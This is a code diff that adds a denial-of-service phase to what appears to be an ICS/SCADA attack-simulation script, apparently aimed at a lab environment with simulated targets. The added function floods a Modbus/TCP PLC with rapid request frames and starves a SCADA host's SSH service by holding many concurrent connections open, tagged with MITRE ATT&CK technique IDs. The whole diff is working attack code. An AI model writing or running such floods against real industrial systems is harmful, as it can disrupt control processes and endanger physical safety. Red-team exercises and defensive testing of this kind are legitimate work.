@@ -736,6 +736,63 @@ def phase8_replay(targets: dict):
         time.sleep(0.1)
 
 
+def phase10_dos(targets: dict):
+    """
+    Phase 10: Denial of Service (DoS) — Modbus/TCP and SCADA Service Starvation
+    MITRE ATT&CK: T0814 (Denial of Service), T1499 (Endpoint Denial of Service), T0815 (Denial of View)
+    Execution:
+      - Sub-millisecond Modbus/TCP request burst exhausting PLC transaction buffers
+      - High-rate TCP connection starvation targeting SCADA SSH service
+    """
+    banner("Phase 10: Denial of Service (DoS) — Modbus & SCADA Connection Starvation")
+
+    plc_ip = targets.get("modbus", "plc_simulator")
+    scada_ip = targets.get("scada_ssh", "ics_scada_ssh")
+
+    cmd_label(f"python3 -c 'Flooding Modbus/TCP {plc_ip}:502 with sub-5ms request bursts'")
+
+    print(f"[*] Launching high-frequency request flood against Modbus PLC ({plc_ip}:{MODBUS_PORT})...")
+    flooded = 0
+    start_t = time.time()
+    try:
+        for _ in range(50):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((plc_ip, MODBUS_PORT))
+                raw_modbus_pdu = struct.pack(">HHHBBHH", 0x1234, 0x0000, 0x0006, 0x01, 0x03, 0x0000, 0x000A)
+                s.sendall(raw_modbus_pdu)
+                flooded += 1
+                s.close()
+            except Exception:
+                pass
+            time.sleep(0.002)
+    except Exception as e:
+        warn(f"Modbus DoS flood notice: {e}")
+
+    duration = time.time() - start_t
+    print(f"[+] Flooded {flooded} rapid Modbus frames in {duration:.2f}s ({flooded/max(duration, 0.01):.1f} req/s).")
+
+    print(f"[*] Launching TCP connection pool starvation against SCADA Host ({scada_ip}:{SSH_PORT})...")
+    conn_list = []
+    try:
+        for _ in range(25):
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.5)
+                s.connect((scada_ip, SSH_PORT))
+                conn_list.append(s)
+            except Exception:
+                pass
+        print(f"[+] Starved {len(conn_list)} concurrent sockets on SCADA host to induce Denial of Service.")
+    finally:
+        for s in conn_list:
+            try:
+                s.close()
+            except Exception:
+                pass
+
+
 # ─────────────────────────────────────────────────────────────────────────────
 PHASES = {
     1: phase1_recon,
@@ -746,6 +803,7 @@ PHASES = {
     6: phase6_lateral_movement,
     7: phase7_privesc,
     8: phase8_replay,
+    10: phase10_dos,
 }
 
 def main():
